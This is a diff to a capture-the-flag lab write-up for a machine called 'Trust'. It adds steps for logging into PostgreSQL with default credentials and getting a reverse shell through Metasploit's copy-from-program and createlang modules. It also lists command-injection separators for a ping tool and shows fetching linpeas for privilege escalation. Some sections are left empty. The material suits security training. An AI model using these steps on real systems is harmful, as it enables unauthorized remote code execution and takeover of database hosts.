@@ -15,12 +15,17 @@ Welcome to the Trust write up.
       - [Connecting to SMB](#connecting-to-smb)
     - [HTTP 666](#http-666)
     - [Postgres 5432](#postgres-5432)
+      - [Metasploit way](#metasploit-way)
+      - [Manual way](#manual-way)
   - [Exploitation Phase](#exploitation-phase)
     - [HTTP 666](#http-666-1)
-    - [postgres 5432](#postgres-5432-1)
+    - [Postgres 5432](#postgres-5432-1)
+      - [Copy from program cmd exec](#copy-from-program-cmd-exec)
+      - [Create Lang](#create-lang)
   - [Privilege Escalation](#privilege-escalation)
     - [Linpeas](#linpeas)
-    - [Manual Way](#manual-way)
+      - [If you don't have internet on the when you are on the reverse shell.](#if-you-dont-have-internet-on-the-when-you-are-on-the-reverse-shell)
+    - [Manual Way](#manual-way-1)
   - [Getting The Flag](#getting-the-flag)
 - [References](#references)
 
@@ -319,6 +324,8 @@ have a command injection. we can test this by a few ways.
 1. Add `|` to the end of the end of the IP
 2. Add `;` to the end of the end of the IP
 3. Add `&&` to the end of the end of the IP
+4. Add `&` to the end of the end of the IP
+5. Add `||` to the end of the end of the IP
 
 **Example**
 ```bash
@@ -351,20 +358,225 @@ have a way to interact with it normally like a website to interact with it
 without a user and password. We will might have to brute force into the
 database.
 
-The first thing we can do is to try to connect to the `postgres` with this
-command:
+There two main way you can do this:
+
+#### Metasploit way
+
+With Metasploit we can use some enumeration tools to scan the postgres service. 
+We need to start up metaspolit with this command:
+```bash 
+msfconsole 
+```
+
+Once it start we can search for anything with the keyword `postgres`
+These should be the results
+
+![msf search postgress](../../Assets/PwnToOwn/msfsreach.png)
+
+we should look that the following:
+- auxiliary/admin/postgres/postgres_login
+- auxiliary/admin/postgres/postgres_sql 
+- auxiliary/scanner/postgres/postgres_hashdump
+- auxiliary/scanner/postgres/postgres_schemadump
+
+When we select the postgres_login by using `use 9` and do `show options` or 
+`options` both will show what arguments you can use. 
+
+Now all we have to do is set `RHOSTS` and `RPORT` These two settings stand for
+remote host and remote port and now we just have to run the auxiliary module.
+
+```bash
+set RHOSTS <IP>
+set RPORT 5432
+exploit
+```
+> Note: You can use the `setg` command insde of `set`. `setg` will set value 
+> you give it and set as a global setting.  
+
+After running this the postgres module, we found that the postgres is using the
+default credentials `postgres:postgres`. Now we could look for some exploits.
+Metasploits make this part SUPER easy with some modules that come with a check 
+functions.
+
+You can use the full path like 
+
+```bash
+use exploit/multi/http/manage_engine_dc_pmp_sqlinkViewFectchServlet.dat 
+``` 
+OR 
+
+```bash
+use 2
+```
+
+If you have been using the `setg` command then you shouldn't need to reset the 
+`rhosts` and `rport`. Once you have everything thing set you can now use the 
+`check` command, If the module you selected have a check function, `msf` will
+run the check.
+
+After a while you should have that the `copy from program cmd exec` and 
+`create lang` could be vulnerable. 
+
+Now we can move on to the exploit phase of the attack. [Exploit Phase](#exploitation-phase)
+
+#### Manual way 
+
+Manual way is a lot harder but it can be done. The first thing we can do is to
+Google how to even connect to the database by it self. Since normally you have 
+someway to interact with it without a `user` and `password`. 
+
+After some googling you might have come across that the default user and 
+password is `postgres:postgres`. It never hurt to try default credentials we 
+can do this by using `psql` command:
 
 ```bash
 psql -h 10.0.0.248 -U postgres -W postgres -P 5432
 ```
 
-SELECT lanname,lanpltrusted,lanacl FROM pg_language;
+After running the command. you should have a connection with the postgres. 
+now that we are in the database what can we do?
+
+```bash
+SELECT lanname,lanpltrusted,lanacl FROM pg_language;  
+```
+
+When we run this command we can see that we have python3 enable. And a lot of 
+google there is a might be a exploit that we can use and its called, 
+`Copy from program cmd exec` exploit. But this exploit needs `metasploit`
+
+Now we can move on to the exploit phase of the attack. [Exploit Phase](#exploitation-phase)
+
+> Note: that the create lang was not talk about in the manual way.
+> As its hard to find without automated tools. 
 
 ## Exploitation Phase
 
 ### HTTP 666
 
-### postgres 5432
+Now that we know that the ping tool on the site can be a command injection 
+point. now we we can see. what can we do. when we run `whoami` we get www-data
+user. We can even look 
+ 
+
+
+ 
+### Postgres 5432
+
+Okay now that we have two exploit that might work. Which even you chose
+we will explain how to use both exploits.
+
+#### Copy from program cmd exec
+
+`Copy from program cmd exec` exploits works by creating a new table and then copy
+the reverse shell payload and then output the table to run the exploit. Then
+the exploit will clean of any tables it made to hide any evidence. 
+
+To start with is to start up metasploit.
+```bash
+msfconsole
+```
+
+Then can use the exploit, with this:
+```bash
+use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
+```
+Now we can set our payload with this 
+```bash
+show payloads
+```
+this will show all compatible payloads and will will use the 
+`cmd/unix/reverse_perl` shell
+
+```bash
+set payload cmd/unix/reverse_perl
+```
+
+Now all we have to do is to set all the settings for exploit.
+
+
+```bash
+msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > show options
+
+Module options (exploit/multi/postgres/postgres_copy_from_program_cmd_exec):
+
+   Name               Current Setting  Required  Description
+   ----               ---------------  --------  -----------
+   DATABASE           template1        yes       The database to authenticate against
+   DUMP_TABLE_OUTPUT  false            no        select payload command output from table (For Debugging)
+   PASSWORD           postgres         no        The password for the specified username. Leave blank for a random password.
+   RHOSTS                              yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT              5432             yes       The target port (TCP)
+   TABLENAME          NKDxwGl79MMV     yes       A table name that does not exist (To avoid deletion)
+   USERNAME           postgres         yes       The username to authenticate as
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+```
+Using the `show options` or `options` command we can see that we need to 
+change the `RHOSTS` and `LHOST`
+
+```bash
+msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set RHOSTS <remote IP>
+RHOSTS => <remote IP>
+msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set LHOST <our IP>
+LHOST => <our IP>
+```
+Now we can use our exploit. With the exploit command.
+![running exploit](../../Assets/PwnToOwn/msfcmdexecexploit.png)
+
+Now we have our shell and we are login as the `postgres` user. After looking
+around we seem like we can't do much.
+
+
+
+#### Create Lang
+
+The `Create lang` exploit works because we can exploit the create language 
+function to allow external scripting language function. Basically the 
+exploit is creating a new function with our exploit and then running it.
+
+We need to select the exploit with this command
+
+``` bash
+use exploit/multi/postgres/postgres_createlang 
+```
+
+now we need to find a good payload with 
+
+```bash
+show payloads
+```
+
+We should select on of the linux payloads with a meterpreter payload.
+This will make the sessions a lot better for us.
+
+```bash
+set payload payload/cmd/unix/python/meterpreter/bind_tcp
+```
+
+Now that we have out payload we need to configure the settings.
+
+
+
+
+
 
 ## Privilege Escalation
 
@@ -401,6 +613,17 @@ Linpeas is very good at finding any privilege escalation method on a linux.
 > Note: Don't think you are safe on windows computer too soon, because there
 > is also Winpeas which is the linpeas of windows.
 
+The first thing to do to get linpeas on our computer or on the machine. 
+
+If you are in kali then you can use this:
+```bash
+wget https://github.com/carlospolop/PEASS-ng/releases/download/20240223-ab2bb023/linpeas.sh
+```
+#### If you don't have internet on the when you are on the reverse shell.
+
+If the Machine you are attacking is not on the internet then you wil have to 
+get linpeas on your main machine. 
+ 
 ### Manual Way
 
 The manual way is going to be a lot more work but that is ok. 
